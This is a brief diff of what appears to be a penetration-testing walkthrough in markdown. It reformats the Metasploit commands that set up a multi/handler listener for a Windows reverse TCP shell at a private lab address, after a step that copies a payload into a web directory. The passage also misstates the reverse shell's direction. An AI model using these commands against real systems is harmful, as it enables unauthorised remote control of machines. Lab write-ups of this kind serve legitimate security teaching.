@@ -658,9 +658,9 @@ Copy the payload file into the web directory
 ![image](https://user-images.githubusercontent.com/97077110/149290400-14f63585-b9a8-45cd-8483-c06545c29a9a.png)
 
 On msfconsole ,create a reverse shell to connect back to the target :  
-```use multi/handler```
-```set LHOST 192.168.86.129```
-```set payload windows/x64/shell/reverse_tcp```
+```use multi/handler```  
+```set LHOST 192.168.86.129```  
+```set payload windows/x64/shell/reverse_tcp```  
 
 ![image](https://user-images.githubusercontent.com/97077110/149290641-f380a358-ada2-48f9-bb63-e7521afb199f.png)  
 
